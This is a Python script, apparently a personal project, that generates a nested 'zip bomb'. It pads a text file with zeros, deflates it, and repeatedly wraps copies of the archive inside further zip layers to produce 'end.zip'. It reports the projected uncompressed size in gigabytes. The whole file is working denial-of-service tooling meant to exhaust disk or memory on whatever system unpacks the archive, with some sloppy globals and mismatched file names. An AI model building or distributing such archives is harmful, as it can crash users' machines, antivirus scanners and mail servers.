import os
import io
import gc
import timeit
import zipfile
import codecs
import tempfile # import the tempfile module

textfile = ""
addtxtsize2 = 0
f1le = ""
textfilesizefloat = float(0)
scale = 1024000 # megabyte
bomb_path = str("C:\\Users\\DyerJ\\Documents\\Questionable") # need to escape \ with \\
bomb_size = float(0)

# end of variable declaration
def addbyte_func(textfile): # this function adds 0's to a text file
    addtxtsize2 = addtxtsize * scale
    starttime = timeit.default_timer() # timer for capturing processing time 
    f1le = open(textfile, "a")
    os.stat(textfile)
    textfilesize = os.stat(textfile).st_size
    desiredfilesize = textfilesize + addtxtsize2
    f1le.close()
    # now add the 0's
    f1le = open(textfile, "a")
    zip_buffer_text = io.BytesIO()
    while textfilesize < desiredfilesize:
        os.stat(textfile)
        for x in range (1, 10):
           zip_buffer_text.write(b"00000000000000000000000000000000000000000000000000000000000000000000000000000000" * 100)
        unzip_buffer_text = codecs.decode(zip_buffer_text.getvalue()) # write buffer value to string
        f1le.write(unzip_buffer_text)
        textfilesize = os.stat(textfile).st_size
       # print(textfilesize)
    textfilesizefloat = textfilesize / scale
    f1le.close()
    del zip_buffer_text # delete buffer from memory
    stoptime = timeit.default_timer() # timer to capture runtime after append
    print("Time taken to add zeros:", f'{stoptime - starttime:.3f}' ,"seconds")
    return textfilesizefloat

# end of function

def file_copy_create(textfile, initreps, depthreps):
    starttime = timeit.default_timer() # timer for capturing processing time                
    
    with open(textfile, "r") as f:
        text_data = f.read()
    
    zip_buffer1 = io.BytesIO()
    
    with zipfile.ZipFile(zip_buffer1, "w", compression=zipfile.ZIP_DEFLATED) as zip_file1:
        zip_file1.writestr(textfile, text_data)
    
    os.remove (textfile) # remove the original text file
    
    for x in range (0, depthreps_int): # now copy all zip files into new zip files
        
        temp_files = [io.BytesIO(zip_buffer1.getvalue()) for _ in range(inthreps_int)]
        
        zip_buffer2 = io.BytesIO() # bytesio object to hold each new depth iteration zip addition
            
        with zipfile.ZipFile(zip_buffer2, "w", compression=zipfile.ZIP_DEFLATED) as zip_file2: # zip_file2 represents zip_buffer2
            for i, temp_file in enumerate(temp_files):
                temp_file.seek(0) # reset file pointer to the beginning
                zip_file2.writestr(f"zip{x}{i}.zip", temp_file.read())
                gc.collect()
        
        del zip_buffer1
        zip_buffer1 = zip_buffer2 # make buffer1 the current 
        gc.collect()
    stoptime = timeit.default_timer() # timer to capture runtime after append
    print("Time taken to compress and copy files:", f'{stoptime - starttime:.3f}' ,"seconds")
    gc.collect()
    return zip_buffer1, len(zip_buffer1.getvalue())



# eof and start of code
if os.path.exists("middletext.txt"):
    os.remove("middletext.txt")
if os.path.exists("bomb.zip"):
    os.remove("bomb.zip")


addtxtsize = int(input("How many megabytes to add (Integer)?"))
file_size = f'{addbyte_func("middletext.txt"):.3f}'
print("Size after appending:",file_size, "MBytes") # same idea as above

initreps = float(input("Initial reps:"))
inthreps_int = int(initreps)
depthreps = float(input("Depth reps:"))
depthreps_int = int(depthreps)
for x in range (0,depthreps_int):
    bomb_size += (initreps**(x+1))
    print(bomb_size)
print("Uncompressed size of bomb.zip:",f'{((addtxtsize*bomb_size)/1000):.3f}',"Gigabytes")
      
areyousure = (input("Do you really want to create that?"))
match areyousure:
    case "yes":
        end_buffer, end_size = file_copy_create("middletext.txt", initreps, depthreps)
        with open("end.zip", "wb") as f:
            f.write(end_buffer.getvalue())
        print("Size of end.zip:", end_size/1024, "Kbytes")
    case "no":
        print("skill isue")
        

#calculate size on uncompressed data
#next step is to find out if the tempdata can be cleaned? Supposedly gc.collect()does this
gc.collect()